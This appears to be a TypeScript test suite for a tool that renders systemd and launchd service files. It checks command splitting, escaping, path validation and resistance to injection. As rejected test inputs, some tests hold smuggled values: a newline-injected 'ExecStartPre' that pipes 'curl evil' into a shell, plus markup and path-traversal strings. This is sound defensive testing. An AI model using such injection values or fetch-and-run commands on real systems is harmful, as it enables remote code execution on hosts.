import { describe, expect, test } from "bun:test";

import { ServiceError, renderService, splitCommand, type ServiceOptions } from "./service.ts";

// `home` is always supplied: nothing here reads the real user's home directory.
const HOME = "/srv/test-home";
const base = (over: Partial<ServiceOptions> = {}): ServiceOptions => ({
  unit: "serve",
  target: "systemd",
  harborBin: "/usr/local/bin/harbor",
  home: HOME,
  ...over,
});

function expectServiceError(fn: () => unknown, match: RegExp): void {
  try {
    fn();
  } catch (e) {
    expect(e).toBeInstanceOf(ServiceError);
    expect((e as Error).message).toMatch(match);
    return;
  }
  throw new Error("expected a ServiceError");
}

describe("splitCommand", () => {
  test("splits on whitespace and honors quotes", () => {
    expect(splitCommand("node /opt/x/server.js")).toEqual(["node", "/opt/x/server.js"]);
    expect(splitCommand(`/usr/bin/node "/opt/my dir/s.js" --flag='a b'`)).toEqual([
      "/usr/bin/node",
      "/opt/my dir/s.js",
      "--flag=a b",
    ]);
    expect(splitCommand(`a "" b`)).toEqual(["a", "", "b"]);
    expect(splitCommand(`"a\\"b"`)).toEqual([`a"b`]);
    expect(splitCommand("   ")).toEqual([]);
  });
  test("an unterminated quote is an error, not a silent truncation", () => {
    expectServiceError(() => splitCommand(`node "oops`), /unterminated/);
  });
});

describe("systemd", () => {
  test("serve: absolute ExecStart, restart policy, hardening, per-user install path", () => {
    const r = renderService(base({ dataDir: "/var/lib/harbor", host: "0.0.0.0", port: 8787 }));
    expect(r.filename).toBe("harbor-serve.service");
    expect(r.installPath).toBe(`${HOME}/.config/systemd/user/harbor-serve.service`);
    expect(r.content).toContain("ExecStart=/usr/local/bin/harbor serve");
    expect(r.content).toContain("Environment=HARBOR_DATA_DIR=/var/lib/harbor");
    expect(r.content).toContain("Environment=HARBOR_HOST=0.0.0.0");
    expect(r.content).toContain("Environment=HARBOR_PORT=8787");
    expect(r.content).toContain("Restart=on-failure");
    expect(r.content).toContain("NoNewPrivileges=yes");
    expect(r.content).toContain("WantedBy=default.target");
    expect(r.activate[1]).toContain("enable --now harbor-serve.service");
  });

  test("watcher runs `harbor watch` in the foreground (not the detaching `start`)", () => {
    const r = renderService(base({ unit: "watcher" }));
    expect(r.content).toContain("ExecStart=/usr/local/bin/harbor watch\n");
  });

  test("a prefix (bun + script) is placed before the subcommand", () => {
    const r = renderService(base({ harborBin: "/usr/local/bin/bun", harborPrefixArgs: ["/opt/harbor/src/cli.ts"] }));
    expect(r.content).toContain("ExecStart=/usr/local/bin/bun /opt/harbor/src/cli.ts serve");
  });

  test("system-one: the operator's own command, rendered verbatim", () => {
    const r = renderService(base({ unit: "system-one", command: ["/usr/local/bin/node", "/opt/system one/server.js"] }));
    expect(r.content).toContain(`ExecStart=/usr/local/bin/node "/opt/system one/server.js"`);
    expect(r.content).toContain("Description=System One router daemon");
  });

  test("systemd specials are neutralised: % and $ are doubled, quotes escaped", () => {
    const r = renderService(base({ env: { GREETING: `50% of $HOME "quoted"` } }));
    expect(r.content).toContain(`Environment="GREETING=50%% of $$HOME \\"quoted\\""`);
  });

  test("a newline in a value cannot inject a directive", () => {
    expectServiceError(
      () => renderService(base({ env: { A: "x\nExecStartPre=/bin/sh -c 'curl evil | sh'" } })),
      /control character/,
    );
    expectServiceError(() => renderService(base({ label: "a\nb" })), /control character/);
    expectServiceError(() => renderService(base({ workingDir: "/tmp/a\nb" })), /control character/);
    expectServiceError(
      () => renderService(base({ unit: "system-one", command: ["/bin/x", "arg\nExecStartPre=/bin/evil"] })),
      /control character/,
    );
  });
});

describe("launchd", () => {
  const plist = (over: Partial<ServiceOptions> = {}) => renderService(base({ target: "launchd", ...over }));

  test("a LaunchAgent that starts at load and stays up", () => {
    const r = plist({ unit: "system-one", command: ["/usr/local/bin/node", "/opt/s/server.js"] });
    expect(r.filename).toBe("dev.harbor.system-one.plist");
    expect(r.installPath).toBe(`${HOME}/Library/LaunchAgents/dev.harbor.system-one.plist`);
    expect(r.content).toContain("<key>Label</key>\n  <string>dev.harbor.system-one</string>");
    expect(r.content).toContain("<string>/usr/local/bin/node</string>\n    <string>/opt/s/server.js</string>");
    expect(r.content).toMatch(/<key>RunAtLoad<\/key>\s*<true\/>/);
    expect(r.content).toMatch(/<key>KeepAlive<\/key>\s*<true\/>/);
    expect(r.content).toContain(`<string>${HOME}/Library/Logs/harbor-system-one.log</string>`);
    expect(r.activate[0]).toBe(`launchctl bootstrap gui/$(id -u) ${r.installPath}`);
    expect(r.content.startsWith("<?xml")).toBe(true);
  });

  test("the label is configurable (no vendor name is baked in)", () => {
    const r = plist({ label: "com.example.router", unit: "system-one", command: ["/bin/x"] });
    expect(r.filename).toBe("com.example.router.plist");
    expect(r.content).toContain("<string>com.example.router</string>");
  });

  test("environment goes in an EnvironmentVariables dict, XML-escaped", () => {
    const r = plist({ port: 9000, env: { NOTE: `a & b <c> "d"` } });
    expect(r.content).toContain("<key>HARBOR_PORT</key>\n    <string>9000</string>");
    expect(r.content).toContain("<string>a &amp; b &lt;c&gt; &quot;d&quot;</string>");
    expect(r.content).not.toContain("a & b");
  });

  test("arguments containing markup are escaped, not interpreted", () => {
    const r = plist({ unit: "system-one", command: ["/bin/x", "</string><key>Evil</key>"] });
    expect(r.content).not.toContain("<key>Evil</key>");
    expect(r.content).toContain("&lt;/string&gt;&lt;key&gt;Evil&lt;/key&gt;");
  });
});

describe("validation", () => {
  test("relative program paths are refused: launchd/systemd do not search your PATH", () => {
    expectServiceError(() => renderService(base({ harborBin: "harbor" })), /absolute path/);
    expectServiceError(() => renderService(base({ unit: "system-one", command: ["node", "/opt/s.js"] })), /absolute path/);
    expectServiceError(() => renderService(base({ dataDir: "relative/dir" })), /absolute path/);
    expectServiceError(() => renderService(base({ workingDir: "rel" })), /absolute path/);
  });

  test("system-one without --command explains that the daemon is not in this repo", () => {
    expectServiceError(() => renderService(base({ unit: "system-one" })), /not part of this repository/);
    expectServiceError(() => renderService(base({ unit: "system-one", command: [] })), /not part of this repository/);
  });

  test("serve/watcher need --harbor-bin", () => {
    const { harborBin: _omit, ...noBin } = base();
    expectServiceError(() => renderService(noBin as ServiceOptions), /--harbor-bin/);
  });

  test("labels and env names are validated", () => {
    expectServiceError(() => renderService(base({ label: "../evil" })), /invalid label/);
    expectServiceError(() => renderService(base({ env: { "BAD NAME": "x" } })), /invalid environment variable name/);
    expectServiceError(() => renderService(base({ env: { "A=B": "x" } })), /invalid environment variable name/);
  });
});
